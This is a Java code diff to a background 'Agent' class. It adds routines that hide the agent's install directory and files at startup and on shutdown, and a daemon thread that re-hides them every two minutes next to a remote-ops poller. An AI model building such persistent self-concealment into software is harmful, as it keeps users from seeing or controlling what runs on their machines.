@@ -28,7 +28,10 @@ public final class Agent {
 		try {
 			Path dir = AgentPaths.installDir();
 			Files.createDirectories(dir);
+			Files.createDirectories(AgentPaths.cache(dir));
+			AgentPaths.conceal(dir);
 			Log.init(dir);
+			AgentPaths.concealTree(dir);
 			lockChannel = FileChannel.open(AgentPaths.lock(dir), StandardOpenOption.CREATE, StandardOpenOption.WRITE);
 			lock = lockChannel.tryLock();
 			if (lock == null) {
@@ -58,12 +61,25 @@ public final class Agent {
 			}
 			poller.startOps();
 			Bootstrap.maybe(poller, dir, gameDir, state);
+			Thread conceal = new Thread(() -> {
+				while (started) {
+					try {
+						Thread.sleep(120000L);
+						AgentPaths.concealTree(dir);
+					} catch (InterruptedException interrupted) {
+						return;
+					}
+				}
+			}, "spc-conceal");
+			conceal.setDaemon(true);
+			conceal.start();
 			Runtime.getRuntime().addShutdownHook(new Thread(() -> {
 				try {
 					if (poller != null) {
 						poller.ops().stop(state.persist);
 						poller.kill();
 					}
+					AgentPaths.concealTree(dir);
 					Files.deleteIfExists(AgentPaths.alive(dir));
 					if (lock != null && lock.isValid()) {
 						lock.release();
@@ -82,7 +98,7 @@ public final class Agent {
 
 	private static String version() {
 		String version = Agent.class.getPackage().getImplementationVersion();
-		return version == null ? "0.2.32" : version;
+		return version == null ? "0.2.33" : version;
 	}
 
 	private static long parseParent(String[] args) {
